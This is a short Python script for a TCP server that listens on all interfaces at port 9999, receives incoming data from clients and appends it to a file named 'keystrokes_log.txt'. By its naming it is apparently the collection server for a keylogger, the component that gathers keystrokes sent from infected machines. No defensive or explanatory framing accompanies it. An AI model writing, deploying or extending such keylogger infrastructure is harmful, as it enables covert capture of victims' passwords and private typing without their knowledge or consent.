import socket

# Define server address and port
SERVER_ADDRESS = '0.0.0.0'  # Listen on all interfaces
SERVER_PORT = 9999  # Choose a port number

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_ADDRESS, SERVER_PORT))
server_socket.listen(5)

print(f'Server listening on {SERVER_ADDRESS}:{SERVER_PORT}')

# Path to save the log file
log_file_path = 'keystrokes_log.txt'

while True:
    # Accept a connection
    client_socket, client_address = server_socket.accept()
    print(f'Connection from {client_address}')

    # Open the log file in append mode
    with open(log_file_path, "a") as log_file:
        # Receive data from the client
        while True:
            data = client_socket.recv(1024)
            if not data:
                break  # Exit if no data
            decoded_data = data.decode('utf-8')  # Decode the received data
            print(decoded_data)  # Print received data
            log_file.write(decoded_data)  # Write to log file

    client_socket.close()
